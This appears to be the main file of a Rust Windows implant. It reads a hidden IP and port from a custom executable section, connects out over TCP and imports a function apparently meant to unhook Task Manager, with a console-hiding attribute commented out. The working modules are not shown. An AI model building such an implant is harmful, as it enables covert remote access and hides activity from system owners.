//#![windows_subsystem = "windows"]
extern crate core;

use crate::winsdk::get_section;
use crate::tcp::setup;
use crate::hardware_bp::unhook_task_mngr;

mod winsdk;
mod tcp;
mod hardware_bp;

fn main() {
    let config = get_section("mysect");

    println!("IP {}", config.ip);
    println!("Port {}", config.port);


    setup(config.ip, config.port);
}


